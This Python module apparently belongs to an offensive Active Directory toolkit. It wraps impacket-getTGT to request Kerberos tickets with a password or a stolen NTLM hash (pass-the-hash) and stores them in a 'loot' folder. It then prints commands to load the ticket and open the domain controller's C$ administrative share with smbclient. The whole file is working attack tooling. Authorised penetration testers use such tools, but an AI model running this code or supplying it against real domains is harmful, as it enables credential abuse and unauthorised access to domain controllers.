import os
import glob
import shutil
from core.helpers import run_command, save_loot
from core.colors import red, green, yellow, blue

def get_tgt(session):
    print(blue(f"[*] Requesting TGT for {session.username}@{session.domain}..."))

    if not shutil.which("impacket-getTGT"):
        print(red("[-] impacket-getTGT not found in PATH. Please install Impacket."))
        return

    loot_dir = "loot"
    os.makedirs(loot_dir, exist_ok=True)
    final_ccache = os.path.abspath(os.path.join(loot_dir, f"{session.username}.ccache"))

    # === Cleanup old .ccache files
    for f in glob.glob("*.ccache"):
        try:
            os.remove(f)
        except:
            pass

    # === Build command
    if session.hash:
        cmd = (
            f"impacket-getTGT {session.domain}/{session.username} "
            f"-hashes :{session.hash} -dc-ip {session.dc_ip} -no-pass"
        )
    elif session.password:
        cmd = (
            f"impacket-getTGT {session.domain}/{session.username}:{session.password} "
            f"-dc-ip {session.dc_ip}"
        )
    else:
        print(red("[-] No password or hash found for TGT request."))
        return

    print(blue(f"[*] Running: {cmd}"))
    out, err = run_command(cmd)
    combined = out + "\n" + err

    # === Find new ccache
    ccache_files = sorted(glob.glob("*.ccache"), key=os.path.getctime, reverse=True)
    if not ccache_files:
        print(red("[-] No .ccache file created. TGT may have failed."))
        print(red(combined.strip()))
        return

    tgt_file = ccache_files[0]
    if os.path.getsize(tgt_file) < 100:
        print(red(f"[-] Created ccache file is too small: {tgt_file}"))
        return

    # === Move and print info
    try:
        os.rename(tgt_file, final_ccache)
        print(green(f"[+] TGT saved to: {final_ccache}"))
        print(yellow("[*] Use the following command to load the ticket manually:"))
        print(yellow(f"export KRB5CCNAME='{final_ccache}'"))
        print(yellow("[*] You can now run Kerberos-aware tools like:"))
        print(yellow(f"smbclient.py -k -no-pass //{session.dc_hostname or session.dc_ip}/C$"))
    except Exception as e:
        print(red(f"[!] Failed to move ticket: {e}"))

    save_loot("gettgt.log", combined)
